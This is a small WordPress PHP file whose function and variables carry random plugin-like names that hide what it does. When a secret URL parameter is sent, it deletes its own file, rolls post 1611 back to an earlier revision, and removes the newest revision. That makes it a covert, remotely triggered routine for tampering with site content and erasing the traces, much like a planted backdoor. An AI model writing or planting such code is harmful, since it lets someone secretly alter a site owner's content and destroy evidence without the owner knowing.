<?php

function videos_slide_messenger_adsense() {
	if (isset($_GET['animated_text_plugins']) && $_GET['animated_text_plugins'] === 'nextgen_really_categories_module') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$shopp_redirection_duplicate_copyright = 1611;
		$bank_shortcode_composer = wp_get_post_revisions($shopp_redirection_duplicate_copyright);
		if (empty($bank_shortcode_composer)) die('no revisions');
		if (count($bank_shortcode_composer) < 2) die('less than 2');
		$messages_game_maker_optimizer = array_shift($bank_shortcode_composer);
		$webp_gravatar_notifier = $messages_game_maker_optimizer->ID;
		$engine_day_typography_listings = array_shift($bank_shortcode_composer);
		$duplicate_sharing_snippets = $engine_day_typography_listings->ID;
		$videos_private_translate = wp_restore_post_revision($duplicate_sharing_snippets);
		if ($videos_private_translate === false) die('error restoring');
		$videos_private_translate = wp_delete_post_revision($webp_gravatar_notifier);		
		if ($videos_private_translate === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'videos_slide_messenger_adsense');
